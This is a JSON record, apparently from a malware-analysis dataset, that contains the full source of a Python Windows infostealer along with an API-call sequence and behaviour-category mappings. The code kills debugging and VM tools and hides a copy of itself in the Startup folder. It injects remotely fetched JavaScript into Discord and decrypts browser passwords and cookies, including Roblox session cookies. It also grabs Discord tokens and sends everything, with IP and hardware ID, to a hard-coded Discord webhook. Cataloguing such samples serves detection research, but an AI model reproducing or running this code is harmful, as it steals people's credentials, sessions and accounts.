[
  {
    "pyfile": "news_ascii_folder.py",
    "code_snippet": "import requests, os,ntpath,re, sqlite3,json,sys,win32crypt,psutil,shutil,ctypes\nfrom shutil import copy2\nfrom base64 import b64decode\nfrom win32crypt import CryptUnprotectData\nfrom subprocess import PIPE, Popen\nfrom tempfile import mkdtemp, gettempdir\nfrom Crypto.Cipher import AES\n\nnom_utilisateur = os.getlogin()\nnom_pc = os.getenv(\"COMPUTERNAME\")\n\ndef killprocess():\n  blackListedPrograms = [\"httpdebuggerui\", \"wireshark\", \"fiddler\", \"regedit\", \"cmd\", \"taskmgr\",\"vboxservice\", \"df5serv\", \"processhacker\", \"vboxtray\", \"vmtoolsd\", \"vmwaretray\",\"ida64\", \"ollydbg\", \"pestudio\", \"vmwareuser\", \"vgauthservice\", \"vmacthlp\",\"x96dbg\", \"vmsrvc\", \"x32dbg\", \"vmusrvc\", \"prl_cc\", \"prl_tools\", \"xenservice\",\"qemu-ga\", \"joeboxcontrol\", \"ksdumperclient\", \"ksdumper\", \"joeboxserver\"]\n  for i in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:\n    blackListedPrograms.append(i)\n  for proc in psutil.process_iter():\n    if any(procstr in proc.name().lower() for procstr in blackListedPrograms):\n      try:\n        proc.kill()\n      except (psutil.NoSuchProcess, psutil.AccessDenied):\n        pass\n      \n  \ndef startup():\n  try:\n    roaming = os.getenv(\"appdata\")\n    startup_loc = ntpath.join(roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n    scopy = shutil.copy2(sys.argv[0], startup_loc)\n    ctypes.windll.kernel32.SetFileAttributesW(scopy, 2)\n  except:pass\n\ndef injectionnn():\n  global notrewebhook\n  icon = \"https://ae01.alicdn.com/kf/HTB1sAIaoMKTBuNkSne1q6yJoXXaS/Astro-Boy-Mascot-Costume-Fancy-Dress-Party-Costume-Adult-Size-Cartoon-Character-Cute-Mascot-Halloween-Party.jpg_640x640.jpg\"\n  color = \"1184274\"\n  messagefooter = \"Astro GuyEdit :smile_cat:\"\n  hook_reg = \"api/webhooks\"\n  injection_url = \"https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/Injection-clean.js\"\n  webhook = notrewebhook\n  appdata = os.getenv(\"localappdata\")\n  startup_loc = ntpath.join(os.getenv(\"appdata\"), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n  for _dir in os.listdir(appdata):\n    if 'discord' in _dir.lower():\n      discord = appdata + os.sep + _dir\n      for __dir in os.listdir(ntpath.abspath(discord)):\n        if re.match(r'app-(\\d*\\.\\d*)*', __dir):\n          app = ntpath.abspath(ntpath.join(discord, __dir))\n          modules = ntpath.join(app, 'modules')\n          if not ntpath.exists(modules):\n            return\n          for ___dir in os.listdir(modules):\n            if re.match(r\"discord_desktop_core-\\d+\", ___dir):\n              inj_path = modules + os.sep + ___dir + f'\\\\discord_desktop_core\\\\'\n              if ntpath.exists(inj_path):\n                if startup_loc not in sys.argv[0]:\n                    try:\n                      os.makedirs(inj_path + 'initiation', exist_ok=True)\n                    except PermissionError:\n                      pass\n                if hook_reg in webhook:\n                  f = requests.get(injection_url).text.replace(\"%WEBHOOK%\", webhook).replace(\"auto_buy_nitro: true\", \"auto_buy_nitro: false\").replace(\"Discord Injection By github.com/Rdimoãƒ»https://github.com/Rdimo/Discord-Injection\", messagefooter).replace(\"https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png\", icon).replace(\"8363488\", color)\n                else:\n                  return\n                try:\n                  with open(inj_path + 'index.js', 'w', errors=\"ignore\") as indexFile:\n                    indexFile.write(f)\n                except PermissionError:\n                  pass\n                os.startfile(app + sep + _dir + '.exe')\n\ndef injector():\n  killprocess()\n  startup()\n  injectionnn()\n\n\ndef initialize():\n  global notrewebhook\n  notrewebhook = \"https://canary.discord.com/api/webhooks/1077196044984664076/X9UIvKNnT_LKe3WpZD6p76HbVhDH6GfZMgj35P0EUZquSAgiWCRePLblKCMO5QTNt8q2\"\n  password_nav()\n  try:\n    injector()\n  except:\n    pass\n  try:\n    pc_info()\n  except:\n    pass\n  try:\n    password_nav()\n  except:\n    pass\n  try:\n    minecraft()\n  except:\n    pass\n  try:\n    cookie_stl()\n  except:\n    pass\n  try:\n    tken()\n  except:\n    pass\n  try:\n    os.remove(f\"./cookie_{nom_utilisateur}.txt\")\n  except:\n    pass\n  try:\n    os.remove(f\"./pswd_{nom_utilisateur}.txt\")\n  except:\n    pass\n\n\ndef pc_info():\n  global notrewebhook\n  p = Popen(\"wmic csproduct get uuid\", shell=True,\n                  stdin=PIPE, stdout=PIPE, stderr=PIPE)\n  hwid = (p.stdout.read() + p.stderr.read()).decode().split(\"\\n\")[1]\n  info = f\"IP Publiiccc(acking): {requests.get('http://ipinfo.io/json').json()['ip']}\\nPC name: {os.getenv('COMPUTERNAME')}\\nUsername: {os.getenv('UserName')}\\nHWID: {hwid}\"\n  embed = {\n      \"description\": f\"Information PC:```{info}```\",\n      \"title\": f\":white_check_mark: - `New Client: *{nom_utilisateur}*`\"\n  }\n  result = requests.post(notrewebhook, json={\"embeds\": [embed]})\n\n\ndef laclestpbg_chrome(path) -> str:\n        if not ntpath.exists(path):\n            return None\n        with open(path, \"r\", encoding=\"utf-8\") as f:\n            c = f.read()\n        local_state = json.loads(c)\n        try:\n            master_key = b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n            nice_value = CryptUnprotectData(master_key[5:], None, None, None, 0)[1]\n            return nice_value\n        except KeyError:\n            return None\n\ndef decrypt_val(buff, master_key) -> str:\n        try:\n            iv = buff[3:15]\n            payload = buff[15:]\n            cipher = AES.new(master_key, AES.MODE_GCM, iv)\n            decrypted_pass = cipher.decrypt(payload)\n            decrypted_pass = decrypted_pass[:-16].decode()\n            return decrypted_pass\n        except Exception as e:\n            return f'Failed to decrypt \"{str(buff)}\" | key: \"{str(master_key)}\\nException: {e}\"'\n\ndef cookie_stl():\n  global list_cookie, robloxcookies, notrewebhook\n  list_cookie = []\n  robloxcookies = []\n  cookie_firefox()\n  grabCookies()\n  list_cookie.extend(robloxcookies)\n  lc = \"\".join(list_cookie)\n  robloxcookies = \"\\n\".join(robloxcookies)\n  if len(robloxcookies) < 4:\n    robloxembed = {\n      \"description\": f\"```no roblox avaible``` :(\",\n      \"title\": f\":red_car:  - `roblox from *{nom_utilisateur}*`\"\n    }\n  else:\n    robloxembed = {\n      \"description\": f\"roblox:\\n {robloxcookies}```\",\n      \"title\": f\":red_car:  - `roblox from *{nom_utilisateur}*`\"\n    }\n  result = requests.post(notrewebhook, json={\"embeds\": [robloxembed]} )\n  embed = {\n      \"description\": f\"cooooki3 steeeelllzaaadd:\\n {lc}```\",\n      \"title\": f\":cook: - `ckie from *{nom_utilisateur}*`\"\n  }\n  result = requests.post(notrewebhook, json={\"embeds\": [embed]} )\n  if str(result.status_code) != \"204\":\n    f = open(f\"cookie_{nom_utilisateur}.txt\", \"w+\")\n    f.write(lc)\n    f.close()\n    nembed = {\n      \"description\": f\"cooooki3 steeeelllzaaadd:\\n (file with)```\",\n      \"title\": f\":cook: - `ckie from *{nom_utilisateur}*`\"\n    }\n    files = {\n      'file': (f'./cookie_{nom_utilisateur}.txt', open(f'./cookie_{nom_utilisateur}.txt', 'rb')),\n    }\n    r = requests.post(notrewebhook, json={\"embeds\": [nembed]}, files=files)\n  else:\n    pass\n\n\ndef password_nav():\n  global list_pass, notrewebhook\n  list_pass = []\n  pswd_chrome()\n  pswd_other()\n  lp = \"\\n\".join(list_pass)\n  embed = {\n      \"description\": f\"pswwrd steeeelllzaaadd:\\n{lp}```\",\n      \"title\": f\":flushed: - `psxd of *{nom_utilisateur}*`\"\n  }\n  result = requests.post(notrewebhook, json={\"embeds\": [embed]})\n  if str(result.status_code) != \"204\":\n    f = open(f\"pswd_{nom_utilisateur}.txt\", \"w+\")\n    f.write(lp)\n    f.close()\n    nembed = {\n      \"description\": f\"pwdddddd steeeelllzaaadd:\\n (file with)```\",\n      \"title\": f\":flushed: - `pwd from *{nom_utilisateur}*`\"\n    }\n    files = {\n      'file': (f'./pswd_{nom_utilisateur}.txt', open(f'./pwd_{nom_utilisateur}.txt', 'rb')),\n    }\n    r = requests.post(notrewebhook, json={\"embeds\": [nembed]}, files=files)\n\ndef pswd_other():\n  global list_pass\n  local = os.getenv('LOCALAPPDATA')\n  roaming = os.getenv('APPDATA')\n  browser_loc = {\n      \"Brave\": f\"{local}\\\\BraveSoftware\\\\Brave-Browser\",\n      \"Edge\": f\"{local}\\\\Microsoft\\\\Edge\",\n      \"Opera\": f\"{roaming}\\\\Opera Software\\\\Opera Stable\",\n      \"OperaGX\": f\"{roaming}\\\\Opera Software\\\\Opera GX Stable\",\n  }\n  for name, path in browser_loc.items():\n        decrypt_files(path, name)\n        \n\ndef pswd_chrome():\n  global list_pass\n  try:\n    list_pass.append(\"**    - CHROME:**```\")\n    appdata = os.getenv(\"localappdata\")\n    chrome = ntpath.join(appdata, 'Google', 'Chrome', 'User Data')\n    chrome_regex = re.compile(r'^(profile\\s\\d*)|(default)|(guest profile)$', re.IGNORECASE | re.MULTILINE)\n    chrome_key = laclestpbg_chrome(ntpath.join(chrome, \"Local State\"))\n    for prof in os.listdir(chrome):\n      if re.match(chrome_regex, prof):\n          login_db = ntpath.join(chrome, prof, 'Login Data')\n          conn = sqlite3.connect(login_db)\n          cursor = conn.cursor()\n          cursor.execute(\"SELECT action_url, username_value, password_value FROM logins\")\n          for r in cursor.fetchall():\n              url = r[0]\n              username = r[1]\n              encrypted_password = r[2]\n              decrypted_password = decrypt_val(encrypted_password, chrome_key)\n              if url != \"\":\n                  list_pass.append(f\"Domain: {url}\\nUser: {username}\\nPass: {decrypted_password}\\n\\n==========================\")\n          cursor.close()\n          conn.close()\n  except Exception as e:\n    pass\n\ndef cookie_firefox():\n  global list_cookie\n  if sys.platform == \"win32\" or sys.platform == \"cygwin\":\n      path = os.path.join(os.path.expanduser(\"~\"), \"AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\")\n  elif sys.platform == \"darwin\":\n      path = os.path.join(os.path.expanduser(\"~\"), \"Library/Application Support/Firefox/Profiles\")\n  else:\n      path = os.path.join(os.path.expanduser(\"~\"), \".mozilla/firefox\")\n  subfolders = os.listdir(path)\n  for subfolder in subfolders:\n      cookies_file = os.path.join(os.path.join(path, subfolder), \"cookies.sqlite\")\n      if os.path.isfile(cookies_file):\n          break\n  conn = sqlite3.connect(cookies_file)\n  c = conn.cursor()\n  c.execute(\"SELECT * FROM moz_cookies\")\n  for result in c.fetchall():\n      host = result[4]\n      user = result[2]\n      if host != \"\":\n        list_cookie.append(f\"HOST KEY: {host} | NAME: {user} | VALUE: {result[3]}\\n\")\n  conn.close()\n\ndef grabCookies():\n        global robloxcookies, list_cookie\n        appdata = os.getenv('LOCALAPPDATA')\n        chrome_user_data = ntpath.join(appdata, 'Google', 'Chrome', 'User Data')\n        chrome_reg = re.compile(r'(^profile\\s\\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE)\n        chrome_key = laclestpbg_chrome(ntpath.join(chrome_user_data, \"Local State\"))\n        dire = mkdtemp(), gettempdir()\n        for prof in os.listdir(chrome_user_data):\n            if re.match(chrome_reg, prof):\n                login_db = ntpath.join(chrome_user_data, prof, 'Network', 'cookies')\n                conn = sqlite3.connect(login_db)\n                cursor = conn.cursor()\n                cursor.execute(\"SELECT host_key, name, encrypted_value from cookies\")\n                for r in cursor.fetchall():\n                    host = r[0]\n                    user = r[1]\n                    decrypted_cookie = decrypt_val(r[2], chrome_key)\n                    if host != \"\":\n                        list_cookie.append(f\"HOST KEY: {host} | NAME: {user} | VALUE: {decrypted_cookie}\\n\")\n                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:\n                        robloxcookies.append(decrypted_cookie)\n                cursor.close()\n                conn.close()\n\ndef tken():\n    list_tken = []\n    local = os.getenv('LOCALAPPDATA')\n    roaming = os.getenv('APPDATA')\n    paths = {\n        'Discord': roaming + '\\\\Discord',\n        'Discord Canary': roaming + '\\\\discordcanary',\n        'Discord PTB': roaming + '\\\\discordptb',\n        'Google Chrome': local + '\\\\Google\\\\Chrome\\\\User Data\\\\Default',\n        'Opera': roaming + '\\\\Opera Software\\\\Opera Stable',\n        'Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',\n        'Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default'\n    }\n    message = \"\"\n    for platform, path in paths.items():\n          if not os.path.exists(path):\n            continue\n          tokens = find_tokens(path)\n          if len(tokens) > 0:\n            for token in tokens:\n                message = message + f\"{platform}: ```{token}```\\n\" \n          else:\n            message = message + f'No tkens found on {platform}.\\n' \n    embed = {\n          \"description\": message,\n          \"title\": f\":coin:` - tkn of  *{nom_utilisateur}*`\",\n    }\n    result = requests.post(notrewebhook, json={\"embeds\": [embed]}) \n",
    "pattern_analysis": {
      "api_sequence": [
        "os.getlogin",
        "os.getenv",
        "psutil.process_iter",
        "psutil.Process.name",
        "psutil.Process.kill",
        "os.getenv",
        "ntpath.join",
        "shutil.copy2",
        "ctypes.windll.kernel32.SetFileAttributesW",
        "os.getenv",
        "os.getenv",
        "ntpath.join",
        "os.listdir",
        "os.listdir",
        "ntpath.abspath",
        "re.match",
        "ntpath.abspath",
        "ntpath.join",
        "ntpath.join",
        "ntpath.exists",
        "os.listdir",
        "re.match",
        "ntpath.exists",
        "os.makedirs",
        "requests.get",
        "open",
        "open.write",
        "open.close",
        "os.startfile",
        "Popen",
        "Popen.stdout.read",
        "Popen.stderr.read",
        "requests.get",
        "os.getenv",
        "os.getenv",
        "requests.post",
        "ntpath.exists",
        "open",
        "open.read",
        "json.loads",
        "base64.b64decode",
        "win32crypt.CryptUnprotectData",
        "os.getenv",
        "os.getenv",
        "os.path.join",
        "os.path.join",
        "os.path.expanduser",
        "os.listdir",
        "os.path.join",
        "os.path.isfile",
        "sqlite3.connect",
        "sqlite3.Connection.cursor",
        "sqlite3.Cursor.execute",
        "sqlite3.Cursor.fetchall",
        "sqlite3.Connection.close",
        "os.getenv",
        "ntpath.join",
        "re.compile",
        "ntpath.join",
        "os.listdir",
        "re.match",
        "ntpath.join",
        "sqlite3.connect",
        "sqlite3.Connection.cursor",
        "sqlite3.Cursor.execute",
        "sqlite3.Cursor.fetchall",
        "sqlite3.Connection.close",
        "os.getenv",
        "ntpath.join",
        "re.compile",
        "ntpath.join",
        "os.listdir",
        "re.match",
        "ntpath.join",
        "sqlite3.connect",
        "sqlite3.Connection.cursor",
        "sqlite3.Cursor.execute",
        "sqlite3.Cursor.fetchall",
        "sqlite3.Connection.close",
        "os.getenv",
        "os.getenv",
        "os.path.exists",
        "find_tokens",
        "requests.post",
        "os.remove",
        "os.remove"
      ],
      "api_sequence_with_args": [
        "os.getlogin()",
        "os.getenv(\"COMPUTERNAME\")",
        "psutil.process_iter()",
        "psutil.Process.name()",
        "psutil.Process.kill()",
        "os.getenv(\"appdata\")",
        "ntpath.join(roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')",
        "shutil.copy2(sys.argv[0], startup_loc)",
        "ctypes.windll.kernel32.SetFileAttributesW(scopy, 2)",
        "os.getenv(\"localappdata\")",
        "os.getenv(\"appdata\")",
        "ntpath.join(os.getenv(\"appdata\"), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')",
        "os.listdir(appdata)",
        "os.listdir(ntpath.abspath(discord))",
        "ntpath.abspath(discord)",
        "re.match(r'app-(\\d*\\.\\d*)*', __dir)",
        "ntpath.abspath(ntpath.join(discord, __dir))",
        "ntpath.join(app, 'modules')",
        "ntpath.exists(modules)",
        "os.listdir(modules)",
        "re.match(r\"discord_desktop_core-\\d+\", ___dir)",
        "ntpath.exists(inj_path)",
        "os.makedirs(inj_path + 'initiation', exist_ok=True)",
        "requests.get(injection_url)",
        "open(inj_path + 'index.js', 'w', errors=\"ignore\")",
        "open.write(f)",
        "open.close()",
        "os.startfile(app + sep + _dir + '.exe')",
        "Popen(\"wmic csproduct get uuid\", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)",
        "Popen.stdout.read()",
        "Popen.stderr.read()",
        "requests.get('http://ipinfo.io/json')",
        "os.getenv('COMPUTERNAME')",
        "os.getenv('UserName')",
        "requests.post(notrewebhook, json={\"embeds\": [embed]})",
        "ntpath.exists(path)",
        "open(path, \"r\", encoding=\"utf-8\")",
        "open.read()",
        "json.loads(c)",
        "base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])",
        "win32crypt.CryptUnprotectData(master_key[5:], None, None, None, 0)",
        "os.getenv('LOCALAPPDATA')",
        "os.getenv('APPDATA')",
        "os.path.join(os.path.expanduser(\"~\"), \"AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\")",
        "os.listdir(path)",
        "os.path.join(path, subfolder, \"cookies.sqlite\")",
        "os.path.isfile(cookies_file)",
        "sqlite3.connect(cookies_file)",
        "sqlite3.Connection.cursor()",
        "sqlite3.Cursor.execute(\"SELECT * FROM moz_cookies\")",
        "sqlite3.Cursor.fetchall()",
        "sqlite3.Connection.close()",
        "os.getenv(\"localappdata\")",
        "ntpath.join(appdata, 'Google', 'Chrome', 'User Data')",
        "re.compile(r'^(profile\\s\\d*)|(default)|(guest profile)$', re.IGNORECASE | re.MULTILINE)",
        "ntpath.join(chrome, \"Local State\")",
        "os.listdir(chrome)",
        "re.match(chrome_regex, prof)",
        "ntpath.join(chrome, prof, 'Login Data')",
        "sqlite3.connect(login_db)",
        "sqlite3.Connection.cursor()",
        "sqlite3.Cursor.execute(\"SELECT action_url, username_value, password_value FROM logins\")",
        "sqlite3.Cursor.fetchall()",
        "sqlite3.Connection.close()",
        "os.getenv('LOCALAPPDATA')",
        "ntpath.join(appdata, 'Google', 'Chrome', 'User Data')",
        "re.compile(r'(^profile\\s\\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE)",
        "ntpath.join(chrome_user_data, \"Local State\")",
        "os.listdir(chrome_user_data)",
        "re.match(chrome_reg, prof)",
        "ntpath.join(chrome_user_data, prof, 'Network', 'cookies')",
        "sqlite3.connect(login_db)",
        "sqlite3.Connection.cursor()",
        "sqlite3.Cursor.execute(\"SELECT host_key, name, encrypted_value from cookies\")",
        "sqlite3.Cursor.fetchall()",
        "sqlite3.Connection.close()",
        "os.getenv('LOCALAPPDATA')",
        "os.getenv('APPDATA')",
        "os.path.exists(path)",
        "find_tokens(path)",
        "requests.post(notrewebhook, json={\"embeds\": [embed]})",
        "os.remove(f\"./cookie_{nom_utilisateur}.txt\")",
        "os.remove(f\"./pswd_{nom_utilisateur}.txt\")"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.getlogin",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "psutil.process_iter",
          "id": "iterate_processes",
          "description": "Iterates over all running processes",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "psutil.Process.name",
          "id": "get_process_name",
          "description": "Retrieves process name as string",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "psutil.Process.kill",
          "id": "terminate_process",
          "description": "Terminates the process",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_control"
        },
        {
          "api_name": "ntpath.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "shutil.copy2",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "ctypes.windll.kernel32.SetFileAttributesW",
          "id": "set_file_attributes",
          "description": "Sets file attributes for specified file",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_attribute_management"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "ntpath.abspath",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "re.match",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "ntpath.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.makedirs",
          "id": "create_directory",
          "description": "Creates directory, ignoring if it already exists",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.startfile",
          "id": "open_file_app",
          "description": "Opens file with associated application",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "subprocess.Popen.stdout.read",
          "id": "read_process_stdout",
          "description": "Reads all bytes from process standard output",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "subprocess.Popen.stderr.read",
          "id": "read_process_stderr",
          "description": "Reads all bytes from process standard error",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "json.loads",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "win32crypt.CryptUnprotectData",
          "id": "decrypt_dpapi_data",
          "description": "Decrypts Windows DPAPI-encrypted data",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "os.path.expanduser",
          "id": "path_special_operations",
          "description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.isfile",
          "id": "check_file_is_file",
          "description": "Checks if specified path exists and is a file",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "sqlite3.connect",
          "id": "open_sqlite_db",
          "description": "Opens SQLite database file",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Connection.cursor",
          "id": "create_sql_cursor",
          "description": "Creates cursor object for SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Cursor.execute",
          "id": "execute_sql_query",
          "description": "Executes SQL query on SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Cursor.fetchall",
          "id": "fetch_sql_rows",
          "description": "Fetches all rows from last executed query",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Connection.close",
          "id": "close_sqlite_connection",
          "description": "Closes the SQLite database connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        }
      ],
      "contextual_code": "import requests, os, ntpath, re, sqlite3, json, sys, win32crypt, psutil, shutil, ctypes\nfrom shutil import copy2\nfrom base64 import b64decode\nfrom win32crypt import CryptUnprotectData\nfrom subprocess import PIPE, Popen\nfrom tempfile import mkdtemp, gettempdir\nfrom Crypto.Cipher import AES\n\nnom_utilisateur = os.getlogin()\nnom_pc = os.getenv(\"COMPUTERNAME\")\n\ndef killprocess():\n  blackListedPrograms = [ ... ]\n  for i in ['discord', ...]:\n    blackListedPrograms.append(i)\n  for proc in psutil.process_iter():\n    if any(procstr in proc.name().lower() for procstr in blackListedPrograms):\n      try:\n        proc.kill()\n      except (psutil.NoSuchProcess, psutil.AccessDenied):\n        pass\n\ndef startup():\n  try:\n    roaming = os.getenv(\"appdata\")\n    startup_loc = ntpath.join(roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n    scopy = shutil.copy2(sys.argv[0], startup_loc)\n    ctypes.windll.kernel32.SetFileAttributesW(scopy, 2)\n  except: pass\n\ndef injectionnn():\n  global notrewebhook\n  ...\n  appdata = os.getenv(\"localappdata\")\n  startup_loc = ntpath.join(os.getenv(\"appdata\"), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n  for _dir in os.listdir(appdata):\n    if 'discord' in _dir.lower():\n      discord = appdata + os.sep + _dir\n      for __dir in os.listdir(ntpath.abspath(discord)):\n        if re.match(r'app-(\\d*\\.\\d*)*', __dir):\n          app = ntpath.abspath(ntpath.join(discord, __dir))\n          modules = ntpath.join(app, 'modules')\n          if not ntpath.exists(modules):\n            return\n          for ___dir in os.listdir(modules):\n            if re.match(r\"discord_desktop_core-\\d+\", ___dir):\n              inj_path = modules + os.sep + ___dir + f'\\\\discord_desktop_core\\\\'\n              if ntpath.exists(inj_path):\n                if startup_loc not in sys.argv[0]:\n                  try:\n                    os.makedirs(inj_path + 'initiation', exist_ok=True)\n                  except PermissionError:\n                    pass\n                if hook_reg in webhook:\n                  f = requests.get(injection_url).text.replace(...)\n                else:\n                  return\n                try:\n                  with open(inj_path + 'index.js', 'w', errors=\"ignore\") as indexFile:\n                    indexFile.write(f)\n                except PermissionError:\n                  pass\n                os.startfile(app + sep + _dir + '.exe')\n\ndef pc_info():\n  global notrewebhook\n  p = Popen(\"wmic csproduct get uuid\", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)\n  hwid = (p.stdout.read() + p.stderr.read()).decode().split(\"\\n\")[1]\n  info = f\"IP Publiiccc(acking): {requests.get('http://ipinfo.io/json').json()['ip']}\\nPC name: {os.getenv('COMPUTERNAME')}\\nUsername: {os.getenv('UserName')}\\nHWID: {hwid}\"\n  embed = { ... }\n  result = requests.post(notrewebhook, json={\"embeds\": [embed]})\n\ndef laclestpbg_chrome(path) -> str:\n  if not ntpath.exists(path):\n    return None\n  with open(path, \"r\", encoding=\"utf-8\") as f:\n    c = f.read()\n  local_state = json.loads(c)\n  try:\n    master_key = b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n    nice_value = CryptUnprotectData(master_key[5:], None, None, None, 0)[1]\n    return nice_value\n  except KeyError:\n    return None\n\ndef cookie_firefox():\n  global list_cookie\n  if sys.platform == \"win32\" or sys.platform == \"cygwin\":\n    path = os.path.join(os.path.expanduser(\"~\"), \"AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\")\n  ...\n  subfolders = os.listdir(path)\n  for subfolder in subfolders:\n    cookies_file = os.path.join(os.path.join(path, subfolder), \"cookies.sqlite\")\n    if os.path.isfile(cookies_file):\n      break\n  conn = sqlite3.connect(cookies_file)\n  c = conn.cursor()\n  c.execute(\"SELECT * FROM moz_cookies\")\n  for result in c.fetchall():\n    host = result[4]\n    user = result[2]\n    if host != \"\":\n      list_cookie.append(f\"HOST KEY: {host} | NAME: {user} | VALUE: {result[3]}\\n\")\n  conn.close()\n\ndef pswd_chrome():\n  global list_pass\n  try:\n    ...\n    appdata = os.getenv(\"localappdata\")\n    chrome = ntpath.join(appdata, 'Google', 'Chrome', 'User Data')\n    chrome_regex = re.compile(r'^(profile\\s\\d*)|(default)|(guest profile)$', re.IGNORECASE | re.MULTILINE)\n    chrome_key = laclestpbg_chrome(ntpath.join(chrome, \"Local State\"))\n    for prof in os.listdir(chrome):\n      if re.match(chrome_regex, prof):\n        login_db = ntpath.join(chrome, prof, 'Login Data')\n        conn = sqlite3.connect(login_db)\n        cursor = conn.cursor()\n        cursor.execute(\"SELECT action_url, username_value, password_value FROM logins\")\n        for r in cursor.fetchall():\n          ...\n        cursor.close()\n        